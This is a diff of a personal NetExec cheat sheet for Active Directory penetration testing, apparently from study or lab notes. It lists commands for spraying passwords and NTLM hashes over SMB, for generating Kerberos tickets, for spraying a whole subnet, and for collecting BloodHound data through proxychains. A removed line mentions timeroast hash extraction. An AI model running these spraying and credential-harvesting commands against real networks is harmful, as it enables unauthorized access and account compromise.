@@ -4,30 +4,27 @@ Note: Pwn3d! means code exec and RDP possible.
 
 Spraying
 	if you have a user list, always try spraying the list on both users and passwords.
-
-#### Proper Install
-```bash
-sudo apt purge netexec
-pipx ensurepath
-pipx install git+https://github.com/Pennyw0rth/NetExec
-```
-
-#### Quick Wins
-```bash
-# Extract password hashes by abusing NTP similar to kerberoasting
--M timeroast
-```
 ## General Usage
+NOTE: sometimes you HAVE to use kerberos (-k) to authenticate. This does not necessarily require a .ccache/.kirbi file.
+
 ```bash
 #Collect creds as you enumerate a network and reuse them
 
 # Spray domain users
-nxc smb 172.16.182.13 -u users -H hashes --continue-on-success
-nxc smb 172.16.182.13 -u users -p passwords --continue-on-success
+nxc smb <target> -d domain -u users -H hashes --continue-on-success [-k]
+nxc smb <target> -d domain -u users -p passwords --continue-on-success [-k]
 
 # Spray for local users
-nxc smb <ip> -U users -P passwords --continue-on-success --local-auth
-nxc smb <ip> -U users -H hashes --continue-on-success --local-auth
+nxc smb <target> -U users -P passwords --continue-on-success --local-auth
+nxc smb <target> -U users -H hashes --continue-on-success --local-auth
+
+# Generate TGT!!!
+nxc smb <target> -d domain -u user -p pass -k --generate-tgt <Username>
+KRB5CCNAME=<Username>.ccache    # Set as env variable
+smbclient.py -k <FQDN>          # Auth example
+
+	# Alternative: 
+	 getTGT.py -dc-ip <ip> 'domain/user:pass'
 
 # Spray subnet for user !!!
 nxc smb 10.10.10.0/24 -u bob -p password123
@@ -80,7 +77,10 @@ nxc ldap <ip> -d '<domain_name>' -u '<user>' -p '<password>' -M get-desc-users
 
 ## Collect Bloodhound data
 ```bash
+# Bloodhound CE
 nxc ldap '<dc_hostname.domain>(or IP address)' -d '<domain_name>' -u '<user>' -p '<password>' --bloodhound -c All --dns-server <ip_address (usually of DC)>
+
+# Bloodhound legacy? use bloodhound-python
 
 # proxychains
 proxychains -q nxc ldap DC1.ad.lab -d 'ad.lab' -u 'john.doe' -p 'P@$$word123!' --bloodhound -c All --dns-server 10.80.80.2 --dns-tcp
